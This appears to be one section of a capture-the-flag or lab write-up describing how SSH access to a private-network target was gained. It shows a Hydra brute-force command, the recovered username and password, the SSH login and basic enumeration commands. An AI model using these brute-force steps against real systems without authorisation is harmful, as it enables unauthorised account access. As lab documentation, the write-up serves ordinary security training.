# Phase 2: Foothold

Documentation of gaining initial access to the target system via SSH.

## Contents

1. **SSH Brute Force** - Hydra-based credential guessing
2. **Credential Discovery** - Valid username and password identification
3. **Remote Shell Access** - SSH connection establishment

## Successful Credentials

- **Username:** `overflow`
- **Password:** `Pass.txt`

## Commands

```bash
hydra -L which_one_lol.txt -p Pass.txt ssh://192.168.108.138
ssh overflow@192.168.108.138
```

## Access Confirmation

```bash
id
whoami
uname -a
```

Result: Non-root shell access as user `overflow`
